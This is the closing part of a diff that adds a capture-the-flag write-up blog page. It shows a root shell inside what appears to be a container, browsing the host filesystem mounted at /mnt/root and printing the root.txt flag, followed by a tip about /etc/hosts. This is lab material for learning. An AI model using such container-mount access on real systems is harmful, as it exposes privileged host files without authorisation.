+</span></span><span class="line"><span class="cl">/ <span class="c1"># cd ..</span>
+</span></span><span class="line"><span class="cl">/ <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">bin            home           metadata.yaml  proc           run            sys            usr
+</span></span><span class="line"><span class="cl">dev            lib            mnt            root           sbin           templates      var
+</span></span><span class="line"><span class="cl">etc            media          opt            rootfs         srv            tmp
+</span></span><span class="line"><span class="cl">/ <span class="c1"># cd root</span>
+</span></span><span class="line"><span class="cl">~ <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">~ <span class="c1"># cd root</span>
+</span></span><span class="line"><span class="cl">/bin/sh: cd: can<span class="err">&#39;</span>t <span class="nb">cd</span> to root: No such file or directory
+</span></span><span class="line"><span class="cl">~ <span class="c1"># cd /mnt/root</span>
+</span></span><span class="line"><span class="cl">/mnt/root <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">bin         etc         lib         media       proc        sbin        sys         var
+</span></span><span class="line"><span class="cl">boot        home        lib64       mnt         root        snap        tmp         vmlinuz
+</span></span><span class="line"><span class="cl">dev         initrd.img  lost+found  opt         run         srv         usr
+</span></span><span class="line"><span class="cl">/mnt/root <span class="c1"># cd root</span>
+</span></span><span class="line"><span class="cl">/mnt/root/root <span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl">root.txt
+</span></span><span class="line"><span class="cl">/mnt/root/root <span class="c1"># cat root.txt</span>
+</span></span><span class="line"><span class="cl">6efc1a5dbb8904751ce6566a305bb8ef
+</span></span></code></pre></div><h1 id="summary">Summary</h1>
+<p>Don’t forget to add DNS to /etc/hosts 😢
+I wasted hours because of this</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/kei5uke" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 kei5uke.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank"  rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
